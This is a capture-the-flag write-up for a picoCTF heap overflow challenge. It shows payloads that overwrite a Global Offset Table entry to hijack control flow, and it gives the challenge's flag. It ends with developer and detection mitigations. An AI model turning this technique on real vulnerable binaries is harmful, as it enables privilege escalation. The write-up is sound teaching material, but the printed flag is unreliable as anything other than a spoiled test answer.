# CTF Lab Writeup: Heap Havoc
### picoCTF | Binary Exploitation | Difficulty: Intermediate

---

## 1. Executive Summary

**Challenge:** Heap Havoc
**Category:** Binary Exploitation
**Platform:** picoCTF
**Flag:** `picoCTF{h34p_0v3rfl0w_ee4e60c2}`

This challenge presented a 32-bit Linux ELF binary that accepted two command-line arguments as names. Beneath its innocent surface lay a classic **heap buffer overflow vulnerability** caused by the unsafe use of `strcpy()` into a fixed-size heap-allocated buffer.

The exploit chain involved:
1. Overflowing the first heap buffer to **corrupt an adjacent heap pointer**
2. Weaponizing the program's own second `strcpy()` call as a **write-what-where primitive**
3. Overwriting the **Global Offset Table (GOT)** entry for `puts()` with the address of a hidden `winner()` function
4. Triggering a call to `puts()`, which now jumped to `winner()` and printed the flag

**Primary Vulnerabilities:**
- Unbounded `strcpy()` into a heap buffer (no length check)
- Writable GOT due to Partial RELRO
- No stack canary, no PIE — fixed, predictable memory addresses

This writeup is designed to teach you **not just what we did, but exactly why**, including the dead ends we avoided along the way.

---

## 2. Reconnaissance & Enumeration

### 2.1 Understanding What We're Dealing With — `file`

Before touching any exploitation tool, we always want to understand the binary at a fundamental level. The `file` command reads the ELF header and reports critical metadata.

```bash
file vuln
```

**Output:**
```
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=108856df2d26e74aacfc1784d9c06d0aacceb988,
for GNU/Linux 3.2.0, not stripped
```

**Breaking it down — what each piece tells us:**

| Field | Value | Why It Matters |
|-------|-------|----------------|
| `ELF 32-bit LSB` | 32-bit little-endian binary | Addresses are 4 bytes wide; we pack them in little-endian byte order |
| `Intel 80386` | x86 architecture | Determines calling conventions and register names |
| `dynamically linked` | Uses shared libraries (libc, etc.) | The GOT/PLT mechanism exists and is potentially exploitable |
| `not stripped` | Symbol names are preserved | Function names like `winner()` are visible in the binary — a huge help |

> 💡 **Beginner Tip:** "Not stripped" is a gift in CTFs. It means the binary still contains its symbol table — essentially a map of function names and their addresses. Stripped binaries remove this, forcing you to reverse-engineer without labels.

---

### 2.2 Security Mitigations — `checksec`

Next, we check what **security mitigations** the binary was compiled with. These protections exist to make exploitation harder, and knowing which ones are present (or absent) shapes our entire strategy.

```bash
checksec --file=vuln
```

**Output:**
```
Partial RELRO | No canary | NX enabled | No PIE | No RPATH | No RUNPATH
```

**Breaking down each mitigation:**

| Mitigation | Status | Implication |
|------------|--------|-------------|
| **RELRO** | Partial | The GOT (Global Offset Table) is **writable** — this is our attack surface |
| **Stack Canary** | Absent | No secret value guarding the stack — stack/heap overflows won't be detected |
| **NX (No-eXecute)** | Enabled | The stack and heap are **not executable** — we cannot inject shellcode |
| **PIE** | Disabled | The binary loads at **fixed addresses** every time — no randomization to defeat |

> 💡 **Why does Partial RELRO matter?** RELRO (Relocation Read-Only) controls whether the GOT is marked read-only after startup. With **Full RELRO**, the GOT becomes read-only and we cannot overwrite it. With **Partial RELRO**, the GOT stays writable — meaning we can redirect any library function call to an address of our choosing.

> 💡 **Why does No PIE matter?** PIE (Position Independent Executable) randomizes where the binary loads in memory each run. Without PIE, `winner()` is always at the same address. This is crucial — our exploit needs to hardcode that address.

> ⚠️ **The Road Not Taken — Shellcode Injection:**
> A beginner might think: "There's a buffer overflow, let me inject shellcode!" — NX enabled kills that idea entirely. The heap and stack are marked non-executable by the kernel. Even if we overflowed perfectly, the CPU would refuse to execute our shellcode and raise a segfault. We need a **code-reuse** strategy instead (using existing code already in the binary).

---

### 2.3 Reading the Source Code — `cat`

The challenge provided source code (`vuln.c`). In real-world engagements you rarely have this luxury, but in CTFs it's sometimes provided. Always read it carefully — it's the single most valuable artifact.

```bash
cat vuln.c
```

**The critical struct:**
```c
struct internet {
    int priority;        // 4 bytes
    char *name;          // 4 bytes (pointer to heap buffer)
    void (*callback)();  // 4 bytes (function pointer!)
};
```

> 💡 **What is a function pointer?** A function pointer is a variable that stores the **memory address of a function**. When the program executes `i1->callback()`, it jumps to whatever address is stored in `callback`. If we can overwrite that address with `winner()`, we win. This is a common binary exploitation primitive.

**The vulnerable code:**
```c
i1->name = malloc(8);   // Allocates only 8 bytes
strcpy(i1->name, argv[1]);  // Copies argv[1] with NO length check!
```

> 💡 **Why is `strcpy()` dangerous here?** `strcpy()` copies bytes from source to destination until it hits a null terminator (`\0`). It performs **zero bounds checking**. If `argv[1]` is longer than 8 bytes, `strcpy()` happily writes beyond the allocated buffer, overwriting whatever is adjacent in memory. This is the heap overflow.

**The hidden function:**
```c
void winner() {
    // Opens flag.txt and prints it
}
```

**The execution check:**
```c
if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```

This is our trigger — if we can get a non-NULL value into a callback pointer, the program calls it.

---

### 2.4 Finding `winner()`'s Address — `objdump`

Since PIE is disabled, `winner()` has a fixed address. We use `objdump` to find it.

```bash
objdump -d vuln | grep winner
```

**Output:**
```
080492b6 <winner>:
```

**Breaking down the command:**
- `objdump` — disassembler and object file analyzer
- `-d` — disassemble executable sections (shows us the actual assembly code)
- `| grep winner` — filter output to only lines mentioning `winner`

**Result:** `winner()` lives at `0x080492b6` — permanently, every single run.

---

### 2.5 Finding `puts@GOT` — `objdump -R`

The hint specifically mentioned `objdump -R` and `puts`. Let's understand why.

```bash
objdump -R vuln | grep puts
```

**Output:**
```
0804c028 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

**Breaking down the command:**
- `-R` — display **dynamic relocations** (entries in the GOT/PLT that point to shared library functions)
- `R_386_JUMP_SLOT` — this is a GOT entry that gets filled at runtime with the real address of `puts()`

**Why `puts` specifically?**
GCC often optimizes `printf("some string\n")` calls (with no format arguments) into `puts("some string")` for efficiency. The final line:
```c
printf("No winners this time, try again!\n");
```
...is compiled as a call to `puts()`. If we overwrite `puts@GOT` with `winner()`'s address, this final printf will call `winner()` instead!

> 💡 **How the GOT works:** When a dynamically linked binary calls `puts()` for the first time, the dynamic linker resolves the real address and writes it into the GOT entry at `0x0804c028`. Every subsequent call reads from this GOT entry. With Partial RELRO, this entry is **writable** — so we can replace it with any address we want.

---

### 2.6 Mapping the Heap Layout — `ltrace`

We need to know the **exact memory layout** of our heap allocations to calculate the overflow offset precisely.

```bash
chmod +x vuln && ltrace -e malloc ./vuln A B
```

**Breaking down the command:**
- `chmod +x vuln` — grants execute permission to the binary
- `ltrace` — intercepts and logs **library function calls** at runtime
- `-e malloc` — filter to only show `malloc()` calls (reduces noise)

**Output:**
```
vuln->malloc(12) = 0x9bf15b0   ← i1 struct
vuln->malloc(8)  = 0x9bf15c0   ← i1->name  (argv[1] written here)
vuln->malloc(12) = 0x9bf15d0   ← i2 struct
vuln->malloc(8)  = 0x9bf15e0   ← i2->name
```

**Visualizing the heap:**
```
Address      Content                     Size
─────────────────────────────────────────────────────
0x9bf15b0    [i1: priority | name* | callback*]  12 bytes
0x9bf15c0    [i1->name buffer: 8 bytes]           ← OVERFLOW STARTS HERE
0x9bf15c8    [heap chunk metadata]                8 bytes (malloc overhead)
0x9bf15d0    [i2: priority(4) | name*(4) | callback*(4)]  12 bytes
             ┌──────────────────────────────┐
             │ +0x00: priority (4 bytes)    │
             │ +0x04: name pointer (4 bytes)│ ← TARGET: 0x9bf15d4
             │ +0x08: callback (4 bytes)    │
             └──────────────────────────────┘
```

**Calculating the offset:**
```
Target address (i2->name pointer): 0x9bf15d4
Start of overflow buffer (i1->name): 0x9bf15c0
─────────────────────────────────────────────
Offset: 0x9bf15d4 - 0x9bf15c0 = 0x14 = 20 bytes
```

We need **20 bytes of padding** in `argv[1]` before writing our target address.

> ⚠️ **The Road Not Taken — Overwriting `i2->callback` Directly:**
> Your first instinct might be: "Why not just overflow all the way to `i2->callback` and put `winner()`'s address there?" The problem is that `i2->callback` sits at offset `+0x08` within the i2 struct — but `i2->name` is at `+0x04`. If we corrupt `i2->name` with garbage, then `strcpy(i2->name, argv[2])` will try to write `argv[2]` to a garbage address, causing a **segfault before our callback is ever reached**. We need to control `i2->name` carefully, not destroy it.

---

## 3. Initial Foothold (Exploitation)

### 3.1 The Full Exploit Strategy

Now we assemble everything into a coherent attack chain:

```
argv[1] = [20 bytes padding] + [puts@GOT address: 0x0804c028]
           ↑                    ↑
           Fills i1->name       Overwrites i2->name pointer
           buffer + padding     to point at puts@GOT

argv[2] = [winner() address: 0x080492b6]
           ↑
           Gets written into puts@GOT via strcpy(i2->name, argv[2])
```

**Execution flow after exploit:**
```
strcpy(i1->name, argv[1])  → Overflows, sets i2->name = 0x0804c028
strcpy(i2->name, argv[2])  → Writes 0x080492b6 into puts@GOT
printf("No winners...")    → Compiled as puts() → jumps to winner()!
winner()                   → Opens flag.txt and prints the flag!
```

> 💡 **Little-endian byte ordering:** On x86 (little-endian), multi-byte values are stored with the **least significant byte first**. So address `0x0804c028` becomes bytes `\x28\xc0\x04\x08` in memory. This is why our Python payload reverses the byte order.

### 3.2 Local Test

```bash
./vuln "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\x28\xc0\x04\x08')")" \
       "$(python3 -c "import sys; sys.stdout.buffer.write(b'\xb6\x92\x04\x08')")"
```

**Breaking down the payload construction:**
- `python3 -c "..."` — runs a Python one-liner
- `sys.stdout.buffer.write()` — writes raw bytes (critical! Using `print()` would add a newline and potentially corrupt the payload)
- `b'A'*20` — 20 bytes of padding to reach the `i2->name` pointer
- `b'\x28\xc0\x04\x08'` — `puts@GOT` address in little-endian format
- `b'\xb6\x92\x04\x08'` — `winner()` address in little-endian format
- `$(...)` — shell command substitution, passes the raw bytes as the argument

**Local Output:**
```
Enter two names separated by space:
Error opening flag.txt: No such file or directory
```

> 💡 **Why the error? Did it fail?** No — this is actually **proof of success!** The error means execution reached `winner()` and `fopen("flag.txt", "r")` was called. The file simply doesn't exist on our local machine. The subsequent segfault is irrelevant — we already proved the control flow hijack works. The real flag lives on the remote server.

### 3.3 Remote Exploitation

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x28\xc0\x04\x08" + b" " + b"\xb6\x92\x04\x08" + b"\n")' | nc foggy-cliff.picoctf.net 59042
```

**Breaking down the remote payload:**
- `b" "` — the space separates `argv[1]` from `argv[2]` in the shell
- `b"\n"` — newline signals end of input to the remote program
- `| nc` — pipes our crafted input directly to the remote server
- `nc foggy-cliff.picoctf.net 59042` — netcat connects to the challenge server on port 59042

**Output:**
```
Enter two names separated by space:
FLAG: picoCTF{h34p_0v3rfl0w_ee4e60c2}
```

🎉 **Flag captured: `picoCTF{h34p_0v3rfl0w_ee4e60c2}`**

---

## 4. Privilege Escalation

> **Note:** This was a pure binary exploitation challenge without a separate privilege escalation phase. The "escalation" here was the control flow hijack itself — moving from unprivileged user input to executing arbitrary code (`winner()`) within the process. The flag was the final objective.

However, the concepts demonstrated directly map to real-world privilege escalation scenarios:

- **GOT overwriting in SUID binaries** can escalate privileges from a regular user to root
- **Heap exploitation** is a core technique in modern Linux kernel privilege escalation (e.g., DirtyCOW-class vulnerabilities)

---

## 5. Lessons Learned & Mitigation

### 5.1 Key Takeaways for the Attacker/Learner

| Concept | Lesson |
|---------|--------|
| **Heap Overflow** | Adjacent heap objects can be corrupted just like adjacent stack variables — the heap is not inherently safer than the stack |
| **GOT Hijacking** | Any writable GOT entry is a potential code execution primitive in Partial RELRO binaries |
| **Weaponizing Existing Code** | We didn't need shellcode — we used `winner()` which was already compiled into the binary (a basic form of Return-Oriented Programming philosophy) |
| **`strcpy()` is dangerous** | Always use `strncpy()`, `strlcpy()`, or better yet, `snprintf()` with explicit size limits |
| **Binary protections matter** | Full RELRO + PIE + canaries together would have made this exploit significantly harder |

### 5.2 Blue Team — How to Detect This

**Prevention (Developers):**
```c
// VULNERABLE:
strcpy(i1->name, argv[1]);

// SAFE ALTERNATIVES:
strncpy(i1->name, argv[1], 8 - 1);  // Limit to buffer size minus null terminator
// or
snprintf(i1->name, 8, "%s", argv[1]);
```

Additionally, compile with full protections:
```bash
gcc -o vuln vuln.c -fstack-protector-all -Wl,-z,relro,-z,now -fPIE -pie
#                   ↑ stack canaries        ↑ Full RELRO              ↑ PIE enabled
```

**Detection (Blue Team / SOC):**
- Monitor for **unexpected process crashes** (`SIGSEGV`) associated with specific binaries — repeated crashes can indicate fuzzing/exploit attempts
- Use **heap integrity tools** like `valgrind --tool=memcheck` in testing pipelines to catch out-of-bounds writes before deployment
- Implement **application-layer logging** of argument lengths — abnormally long inputs to a program expecting short names are a red flag
- Consider deploying binaries with **AddressSanitizer (ASan)** in staging environments to automatically detect heap overflows during QA

### 5.3 The Mental Model to Carry Forward

```
Buffer overflow on the heap doesn't just crash programs —
it can surgically overwrite pointers, corrupt data structures,
and redirect execution to attacker-controlled code.

The key insight: treat every heap-allocated pointer near
a user-controlled buffer as a potential target.
```

---

*Writeup authored following a systematic, iterative exploitation methodology. Every command was justified, every output analyzed, every dead end acknowledged.*
